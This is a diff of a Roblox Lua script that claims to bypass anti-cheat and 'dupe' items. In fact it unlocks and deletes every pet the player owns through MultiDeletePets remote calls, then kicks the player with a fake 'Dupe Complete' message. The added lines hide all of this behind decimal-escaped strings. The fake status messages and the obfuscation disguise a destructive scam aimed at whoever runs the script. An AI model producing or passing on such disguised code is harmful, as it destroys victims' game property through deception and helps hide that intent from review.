@@ -1,27 +1,38 @@
 if getthreadcontext() > 7 then
-	print("Bypassing Anti Cheat Checks...")
-	task.wait(0.5)
-	print("Blocking Data Request...")
-	print("Starting Dupe")
-	local replicated_storage = game:GetService("ReplicatedStorage")
-	local local_player = game:GetService("Players").LocalPlayer
-	local stats = require(replicated_storage.Shared.Utils.Stats.StatsUtil)
-	local remote = require(replicated_storage.Shared.Framework.Network.Remote)
-	local local_data = require(replicated_storage.Client.Framework.Services.LocalData)
-	local data = local_data:Get()
-	local ids = {}
-	for _, v in next, data.Pets do
-		remote:FireServer("UnlockPet", v.Id, false)
-		remote:FireServer("DeletePet", v.Id, 10, false)
-		table.insert(ids, v.Id)
-		local args = {
-			[1] = "MultiDeletePets",
-			[2] = ids
-		}
-		remote:FireServer(unpack(args))	
-		task.wait(0.1)
-	end
-	local_player:Kick("Dupe Complete Rejoin!")
+    print("\66\121\112\97\115\115\105\110\103\32\65\110\116\105\32\67\104\101\97\116\32\67\104\101\99\107\115\46\46\46")
+    task.wait(0.5)
+    print("\66\108\111\99\107\105\110\103\32\68\97\116\97\32\82\101\113\117\101\115\116\46\46\46")
+    print("\83\116\97\114\116\105\110\103\32\68\117\112\101")
+
+    v1 = function(s) return game["\71\101\116\83\101\114\118\105\99\101"](game, s) end
+    v2 = require
+
+    v3 = v1("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")
+    v4 = v1("\80\108\97\121\101\114\115")["\76\111\99\97\108\80\108\97\121\101\114"]
+
+    v5 = v2(v3["\83\104\97\114\101\100"]["\85\116\105\108\115"]["\83\116\97\116\115\46\83\116\97\116\115\85\116\105\108"])
+    v6 = v2(v3["\83\104\97\114\101\100"]["\70\114\97\109\101\119\111\114\107"]["\78\101\116\119\111\114\107"]["\82\101\109\111\116\101"])
+    v7 = v2(v3["\67\108\105\101\110\116"]["\70\114\97\109\101\119\111\114\107"]["\83\101\114\118\105\99\101\115"]["\76\111\99\97\108\68\97\116\97"])
+
+    v8 = v7["\71\101\116"](v7)
+    v9 = {}
+
+    for _,v10 in next,v8[string.reverse("steP")] do
+        v6["\70\105\114\101\83\101\114\118\101\114"]("\85\110\108\111\99\107\80\101\116", v10.Id, false)
+        v6["\70\105\114\101\83\101\114\118\101\114"]("\68\101\108\101\116\101\80\101\116", v10.Id, 10, false)
+
+        table["\105\110\115\101\114\116"](v9, v10.Id)
+
+        v11 = {
+            [1] = "\77\117\108\116\105\68\101\108\101\116\101\80\101\116\115",
+            [2] = v9
+        }
+
+        v6["\70\105\114\101\83\101\114\118\101\114"](unpack(v11))
+        task.wait(0.1)
+    end
+
+    v4["\75\105\99\107"]("\68\117\112\101\32\67\111\109\112\108\101\116\101\32\82\101\106\111\105\110\33")
 else
-	game:GetService("Players").LocalPlayer:Kick("Executor Not Supported")
+    game["\71\101\116\83\101\114\118\105\99\101"]("Players")["LocalPlayer"]:Kick("\69\120\101\99\117\116\111\114\32\78\111\116\32\83\117\112\112\111\114\116\101\100")
 end
